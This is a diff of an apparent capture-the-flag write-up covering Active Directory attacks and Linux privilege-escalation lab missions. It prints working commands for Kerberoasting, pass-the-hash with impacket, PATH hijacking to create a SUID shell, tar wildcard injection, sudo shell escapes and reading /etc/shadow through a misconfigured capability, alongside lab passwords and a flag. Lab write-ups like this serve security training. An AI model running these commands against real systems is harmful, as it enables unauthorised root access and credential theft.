@@ -1,18 +1,14 @@
----
-hidden: true
----
-
 # CSA Cympire Cywaria 2026
 
 ## Round 1
 
 ## Challenge 1 Web
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 &#x20;
 
@@ -416,7 +412,7 @@ READ:../../../../../../etc/environment
 
 PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"
 
-<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 You have SSH access as a user inside the linux machine, connect to the server and find the first flag at the home folder of "flagkeeper".
 
@@ -448,7 +444,7 @@ sudo find /root -name flag.txt -exec cat {} \\;
 
 
 
-<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -492,11 +488,11 @@ impacket-GetADUsers -all -dc-ip 44.210.83.134 iceberg.local/zara.hall:"WeAreOne\
 
 
 
-<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 impacket-GetUserSPNs -request -dc-ip 44.210.83.134 iceberg.local/zara.hall:"WeAreOne\\!9@8#7"
 
@@ -524,11 +520,11 @@ $krb5tgs$23$\*sql\_svc$ICEBERG.LOCAL$iceberg.local/sql\_svc\*$92a5d74271838f72fa
 
 
 
-<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
-<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -548,7 +544,7 @@ mousepad mission2tgs.hash
 
 
 
-<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -572,7 +568,7 @@ Session completed.
 
 
 
-<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -590,19 +586,19 @@ Submit the name File located in the administrator Desktop . (e.g. administrator.
 
 &#x20;
 
-![](<.gitbook/assets/unknown (10).png>)
+![](<.gitbook/assets/unknown (10) (1).png>)
 
 sudo nano /etc/hosts
 
-![](<.gitbook/assets/unknown (11).png>)
+![](<.gitbook/assets/unknown (11) (1).png>)
 
 &#x20;
 
-![](<.gitbook/assets/unknown (12).png>)
+![](<.gitbook/assets/unknown (12) (1).png>)
 
-![](<.gitbook/assets/unknown (13).png>)
+![](<.gitbook/assets/unknown (13) (1).png>)
 
-![](<.gitbook/assets/unknown (14).png>)
+![](<.gitbook/assets/unknown (14) (1).png>)
 
 impacket-smbclient -hashes :5f754bcffe28b5bb5a1581d9bbd4e98c 'iceberg.local/WIN10-EXEC01$@44.210.83.134'
 
@@ -610,16 +606,393 @@ impacket-smbclient -hashes :5f754bcffe28b5bb5a1581d9bbd4e98c 'iceberg.local/WIN1
 
 impacket-secretsdump -hashes :5f754bcffe28b5bb5a1581d9bbd4e98c 'iceberg.local/WIN10-EXEC01$@44.221.50.166'
 
-![](<.gitbook/assets/unknown (15).png>)
+![](<.gitbook/assets/unknown (15) (1).png>)
 
 evil-winrm -i 44.221.50.166 -u 'TARGET\_USER' -H '\<HASH\_FROM\_CERTIPY>'
 
-![](<.gitbook/assets/unknown (16).png>)
+![](<.gitbook/assets/unknown (16) (1).png>)
 
-![](<.gitbook/assets/unknown (17).png>)
+![](<.gitbook/assets/unknown (17) (1).png>)
 
-![](<.gitbook/assets/unknown (18).png>)
+![](<.gitbook/assets/unknown (18) (1).png>)
 
 &#x20;
 
 Btw, I know is iceberg.local because cannot connect to rdp, then I saw iceberg.local domain.
+
+
+
+### Linux Security
+
+The Magician02:16:10
+
+Mission 1: The Capability Trap
+
+Exploit Linux capabilities on custom binaries to escalate privileges. Standard SUID binaries have been removed - find the misconfigured capability that grants root access.<br>
+
+Port: 2221
+
+SSH Command: ssh developer@ -p \<PORT>
+
+Password: P@ssw0rd!2025WebDev<br>
+
+Flag Location: Retrieve the flag from /root/flag.txt after gaining root access.
+
+
+
+developer@privesc-medium:\~$ nano exploit.py
+
+![](<.gitbook/assets/unknown (1).png>)
+
+developer@privesc-medium:\~$ chmod +x exploit.py
+
+\
+![](.gitbook/assets/image.png)
+
+
+
+The Magician02:23:12
+
+Mission 2: PATH Hijacking
+
+Abuse SUID binaries that use relative paths to execute commands. Hijack the PATH environment variable to gain root privileges.
+
+<br>
+
+Port: 2222
+
+SSH Command: ssh developer@ -p \<PORT>
+
+Password: P@ssw0rd!2025WebDev
+
+<br>
+
+Flag Location: Retrieve the flag from /root/flag.txt after gaining root access.
+
+\
+find / -perm -4000 -type f -not -path "/proc/\*" -not -path "/sys/\*" 2>/dev/null
+
+![](<.gitbook/assets/unknown (2).png>)
+
+\
+strings $(find / -perm -4000 -type f -not -path "/proc/\*" -not -path "/sys/\*" 2>/dev/null) | grep -E "^\w+/.\*$"
+
+![](<.gitbook/assets/unknown (3).png>)
+
+<br>
+
+echo '#!/bin/bash' > /tmp/ls
+
+echo 'cp /bin/bash /tmp/bash\_root' >> /tmp/ls
+
+echo 'chmod +s /tmp/bash\_root' >> /tmp/ls
+
+chmod +x /tmp/ls
+
+<br>
+
+![](<.gitbook/assets/unknown (4).png>)
+
+<br>
+
+export PATH="/tmp:$PATH"
+
+<br>
+
+![](<.gitbook/assets/unknown (5).png>)
+
+<br>
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+
+
+![](<.gitbook/assets/unknown (6).png>)
+
+
+
+The Magician02:48:28
+
+Mission 3: Wildcard Injection
+
+Exploit wildcard characters in automated cron scripts. Tar and chown commands process files with dangerous wildcards - create malicious filenames to execute arbitrary commands as root.
+
+
+
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+
+
+![](<.gitbook/assets/unknown (7).png>)
+
+
+
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+
+
+developer@wildcard-medium:\~$ touch /home/developer/--checkpoint=1
+
+developer@wildcard-medium:\~$ touch /home/developer/--checkpoint-action=exec=sh\ exploit.sh
+
+<br>
+
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+Answer: cyberolympians{wildc4rd\_1nj3ct10n\_t4r\_pwn4g3\_2025}
+
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+
+
+The Magician03:07:39
+
+Mission 4: Sudo Exploitation
+
+Escape from restricted sudo commands. Several scripts can be run as root via sudo - find a way to break out and spawn a root shell through vi, less, find, or env.
+
+<br>
+
+Port: 2224
+
+SSH Command: ssh developer@ -p \<PORT>
+
+Password: P@ssw0rd!2025WebDev
+
+<br>
+
+Flag Location: Retrieve the flag from /root/flag.txt after gaining root access.
+
+
+
+![](<.gitbook/assets/image (10).png>)<br>
+
+<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+
+
+![](<.gitbook/assets/unknown (9).png>)
+
+
+
+![](<.gitbook/assets/unknown (10).png>)
+
+
+
+TF=$(mktemp)
+
+echo 'os.execute("/bin/sh")' > $TF
+
+sudo nmap --script=$TF
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-13 08:23 UTC
+
+NSE: Warning: Loading '/tmp/tmp.vM6zQtLEzj' -- the recommended file extension is '.nse'.
+
+\# root
+
+\# cat: '/opt/database/flg'$'\b''ag.txt': No such file or directory
+
+\# cat: /opt/database/flag.txt: No such file or directory
+
+\# /home/developer/tools
+
+\# total 8
+
+drwxr-xr-x 2 root root 4096 Oct 13 14:03 .
+
+drwxr-xr-x 1 root root 4096 Dec 31 08:58 ..
+
+\
+![](<.gitbook/assets/unknown (11).png>)
+
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+<br>
+
+![](<.gitbook/assets/unknown (12).png>)
+
+<br>
+
+![](<.gitbook/assets/unknown (13).png>)
+
+<br>
+
+The Magician03:44:52
+
+Target 2: Part 2 (4  missions)
+
+/static/media/blue-help-icn.3c7e59dac8288a14bf8adc198f6a0c61.svg avatar
+
+The Magician03:44:52
+
+Mission 1: Kernel Capability Maze
+
+Multi-stage privilege escalation using advanced Linux capabilities to gain root access.
+
+<br>
+
+Port: 3331
+
+SSH Command: ssh developer@ -p \<PORT>
+
+Password:P@ssw0rd!2025WebDev
+
+<br>
+
+Flag Location: Retrieve the flag from /root/flag.txt after gaining root access.
+
+\
+![](<.gitbook/assets/image (14).png>)
+
+
+
+getcap -r / 2>/dev/null
+
+<br>
+
+![](<.gitbook/assets/unknown (14).png>)
+
+<br>
+
+/opt/.system/tools/legacy/deprecated/old\_utils/py3\_legacy -c 'print(open("/etc/shadow").read())'
+
+<br>
+
+![](<.gitbook/assets/unknown (15).png>)
+
+<br>
+
+![](<.gitbook/assets/unknown (16).png>)
+
+<br>
+
+/opt/.system/tools/legacy/deprecated/old\_utils/py3\_legacy -c 'print(open("/etc/sudoers").read())'
+
+\
+![](<.gitbook/assets/image (15).png>)
+
+
+
+<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+
+
+
+If you find a binary listed with NOPASSWD, you can immediately escalate to root. For example, if secadmin can run find as root:
+
+su secadmin (once you crack the hash)
+
+sudo find . -exec /bin/sh -p \\; -quit
+
+![](<.gitbook/assets/image (17).png>)\
+/opt/.system/tools/legacy/deprecated/old\_utils/py3\_legacy -c 'import os; print(\[os.path.join(dp, f) for dp, dn, filenames in os.walk("/root") for f in filenames])'
+
+\['/root/.bashrc', '/root/.profile', '/root/.credentials.enc']
+
+<br>
+
+/opt/.system/tools/legacy/deprecated/old\_utils/py3\_legacy -c 'print(open("/root/.credentials.enc", "rb").read())'
+
+b'U2FsdGVkX19h/IuxRZZwH/l4O33HaLw3XSmWmsEEzrOt5lC8JnAOIo3fkrd+HeL2\n'
+
+<br>
+
+
+
+![](<.gitbook/assets/unknown (17).png>)
+
+
+
+![](<.gitbook/assets/unknown (18).png>)
+
+<br>
+
+The Magician04:29:51
+
+Mission 2: Multi-Level Buffer Overflow
+
+There is three-stage buffer overflow to exploit for reaching root.
+
+<br>
+
+Port: 3332
+
+SSH Command: ssh developer@ -p \<PORT>
+
+Password: P@ssw0rd!2025WebDev
+
+<br>
+
+Flag Location: Retrieve the flag from /root/flag.txt after gaining root access.
+
+\
+![](<.gitbook/assets/image (18).png>)
+
+gdb /opt/challenges/level3/vuln
+
+<br>
+
+The Magician04:34:51
+
+Mission 3: Shared Object Injection
+
+Hijack shared library loading via RPATH and LD\_LIBRARY\_PATH. create a malicious object to execute code as root.
+
+<br>
+
+Port: 3333
+
+SSH Command: ssh developer@ -p \<PORT>
+
+Password: Developer2025
+
+<br>
+
+Flag Location: Retrieve the flag from /root/flag.txt after gaining root access.
+
+<br>
+
+![](<.gitbook/assets/unknown (19).png>)
+
+
+
+<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+
+
+
+The Magician04:39:54
+
+Mission 4: Race Condition Exploitation
+
+Exploit TOCTOU (Time-of-Check-Time-of-Use) race conditions. A privileged script checks file permissions before reading .
+
+<br>
+
+Port: 3334
+
+SSH Command: ssh developer@ -p \<PORT>
+
+Password: P@ssw0rd!2025WebDev
+
+<br>
+
+Flag Location: Retrieve the flag from /root/flag.txt after gaining root access.
+
+<br>
+
